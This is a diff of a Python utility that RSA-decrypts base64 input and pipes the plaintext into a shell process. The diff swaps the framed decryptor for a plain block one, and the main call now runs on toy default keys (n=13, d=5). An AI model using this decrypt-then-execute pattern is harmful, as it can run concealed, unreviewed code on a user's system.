@@ -1,15 +1,14 @@
 #!/usr/bin/python3
 from binascii import hexlify
+from io import RawIOBase
 from struct import pack
 
 
-def bytes2int(raw_bytes):
-    # type: (bytes) -> int
+def bytes2int(raw_bytes=b""):
     return int(hexlify(raw_bytes), 16)
 
 
-def int2bytes(n):
-    # type: (int) -> bytes
+def int2bytes(n=13):
     if n < 0:
         raise ValueError("Negative numbers cannot be used: %i" % n)
     elif n == 0:
@@ -22,47 +21,26 @@ def int2bytes(n):
     return b"".join(a)
 
 
-def decrypt(crypto, n, d):
+def decrypt(crypto=b"", n=13, d=5):
     return int2bytes(pow(bytes2int(crypto), d, n))
 
 
-def decode_stream(src):
-    b = src.read(1)
-    if b:
-        shift = result = 0
-        while 1:
-            i = ord(b)
-            result |= (i & 0x7F) << shift
-            if not (i & 0x80):
-                break
-            shift += 7
-            b = src.read(1)
-        return result
-    else:
-        return -1
-
-
-def vdecrypt(n, d, src, out, i=0):
-    from io import BytesIO
-
-    s = decode_stream(src)
-    while s > 0:
-        cypher = src.read(s)
+def s_decrypt(src: RawIOBase, out: RawIOBase, n=13, d=5):
+    m = n.bit_length()
+    block_size, R = divmod(m, 8)
+    block_size += 1 if R else 0
+    cypher = src.read(block_size)
+    while cypher:
+        next_cypher = src.read(block_size)
+        if next_cypher:
+            assert len(cypher) == block_size
         blob = decrypt(cypher, n, d)
-        # print('D', i, s, len(blob))
-        b = BytesIO(blob)
-        salt = decode_stream(b)
-        index = decode_stream(b)
-        block = b.read()
-        assert index == i
-        assert salt != 0
-        out.write(block)
-        i += 1
-        s = decode_stream(src)
+        out.write(blob)
+        cypher = next_cypher
 
 
 def decode_base64_source(src, n=None):
-    from base64 import b64decode, standard_b64decode
+    from base64 import b64decode
 
     """Get a stream of decoded bytes from an iterable of base 64 bytes."""
     # https://stackoverflow.com/questions/55483846/python-stream-decode-base64-to-valid-utf8
@@ -125,4 +103,4 @@ if __name__ == "__main__":
             p = Popen(env["SHELL"] or "/bin/sh", stdin=PIPE)
             w = p.stdin
     with r, w:
-        vdecrypt(N, X, r, w)  # noqa: F821 # undefined name
+        s_decrypt(r, w)
